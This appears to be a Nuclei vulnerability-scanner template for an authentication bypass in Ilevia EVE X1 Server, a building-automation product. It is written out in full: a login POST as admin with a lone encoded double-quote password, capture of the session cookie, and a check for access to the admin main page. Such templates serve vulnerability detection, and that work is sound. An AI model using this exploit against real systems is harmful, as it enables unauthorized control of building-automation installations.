id: Ilevia-EVE-X1-Server-login_php-Authentication-bypass

info:
  name: Ilevia EVE X1 Server login.php 身份认证绕过漏洞
  author: Ilevia
  severity: high
  tags: Authentication bypass

http:
  - raw:
      - |
        POST /login/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userid=admin&passwd=%22&login=Login
    extractors:
      - type: regex
        part: header
        name: userToken
        group: 1
        regex:
          - 'PHPSESSID=(.*?);'
        internal: true
  - raw:
      - |
        GET /main/index.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{userToken}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'EVE X1 Server'
          - 'ilevia - building automation'
          - 'Setting'
        condition: and
      - type: status
        status: 
          - 200